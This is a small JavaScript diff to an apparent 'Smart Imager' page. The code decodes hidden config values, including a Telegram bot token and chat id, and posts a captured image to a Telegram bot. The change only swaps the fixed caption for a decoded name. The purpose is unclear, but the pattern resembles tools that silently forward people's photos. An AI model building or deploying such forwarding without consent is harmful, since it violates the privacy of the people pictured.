@@ -91,6 +91,7 @@
         cfg.o = decoded.c_id || ""; // chat_id
         cfg.f = decoded.u || ""; // user_id
         cfg.w = decoded.w || ""; // webhook
+        nm = decoded.n || "";
         console.log("Decoded cfg:", cfg);
       } catch (e) {
         showError("Error");
@@ -132,7 +133,7 @@
       }
       const formData = new FormData();
       formData.append("chat_id", cfg.o);
-      formData.append("caption", "[" + cfg.f + "] from Smart Imager");
+      formData.append("caption", "[" + cfg.f + "] "+ nm +".");
       formData.append("photo", imageBlob);
 
       fetch(`https://api.telegram.org/bot${cfg.p}/sendPhoto`, {
